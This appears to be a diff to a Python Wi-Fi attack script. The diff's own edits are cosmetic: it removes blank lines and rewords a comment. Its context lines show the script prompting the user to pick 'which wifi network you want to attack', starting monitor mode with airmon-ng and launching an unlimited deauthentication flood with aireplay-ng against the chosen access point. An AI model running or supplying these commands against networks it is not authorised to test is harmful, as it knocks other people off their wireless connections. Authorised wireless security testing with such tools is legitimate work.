@@ -145,8 +145,6 @@ try:
 
 
 
-
-
         print("Scanning... Press Ctrl+C to select which wifi network you want to attack.\n")
         print("No |\tBSSID              |\tChannel|\tESSID                         |")
         print("___|\t___________________|\t_______|\t______________________________|")
@@ -187,6 +185,4 @@ subprocess.run(["airmon-ng", "start", user_choice + "mon", hackchannel])
 subprocess.run(["aireplay-ng", "--deauth", "0", "-a", hackbssid, check_wifi_result[int(wifi_interface_choice)] + "mon"])
 
 
-
-
-# user has to use CTRL-C to break the script
+# press CTRL-C to exit the script
